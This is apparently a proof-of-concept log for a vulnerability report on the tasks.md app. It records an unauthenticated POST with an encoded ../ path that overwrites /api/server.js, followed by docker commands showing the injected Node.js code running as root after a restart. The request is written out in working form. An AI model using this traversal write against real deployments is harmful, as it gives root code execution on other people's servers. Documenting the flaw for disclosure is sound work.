@@ -1,0 +1,30 @@
+Unauthenticated Remote Code Execution as root via path-traversal arbitrary write to /api/server.js
+Target: baldissaramatheus/tasks.md:latest, http://localhost:8092 (no credentials sent)
+Captured live during verification on 2026-10-02.
+
+# Step 1 - EXPLOIT: unauth POST overwrites /api/server.js (TASKS_DIR=/tasks, so ../../api escapes)
+$ curl -X POST "http://localhost:8092/_api/resource/..%2f..%2fapi%2fserver.js" \
+       -H "Content-Type: application/json" \
+       --data '{"isFile":true,"content":"<attacker nodejs payload>"}'
+exploit POST status=201
+
+# Step 2 - confirm file on disk was replaced with attacker JS
+$ docker exec tasksmd head -c 90 /api/server.js
+const cp = require('child_process');const fs = require('fs');try {  const out = 'RCE_OK ui...
+
+# Step 3 - process restart (README mandates `--restart unless-stopped`; also occurs on
+#          host reboot, image update, or any crash). Entrypoint re-execs `node /api/server.js`.
+$ docker restart tasksmd
+
+# Step 4 - attacker code ran AS ROOT:
+$ docker exec tasksmd cat /RCE_PROOF_TASKSMD.txt
+RCE_OK uid=uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) host=0a3b5a73e5aa ts=2026-10-02T04:45:17.060Z
+
+$ curl -s http://localhost:8092/
+pwned-via-unauth-arbitrary-write
+
+RESULT: arbitrary attacker-controlled Node.js executes as uid=0(root) inside the container.
+The write->execute chain was independently confirmed earlier: a payload with a JS syntax
+error caused `node /api/server.js` to fail at module load with
+"SyntaxError: Invalid or unexpected token" - proving the attacker-written file becomes the
+process entry point.
